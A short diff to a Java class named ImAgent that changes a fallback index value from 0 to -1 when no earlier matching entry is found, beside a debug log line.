@@ -252,7 +252,7 @@ public final class ImAgent extends Agent implements BacklightObserver,
         }
 
         if (lastEqual <= 0) {
-            lastEqual = 0;
+            lastEqual = -1;
             //#ifdef DEBUG
             debug.info("add: no found, save everything.");
             //#endif
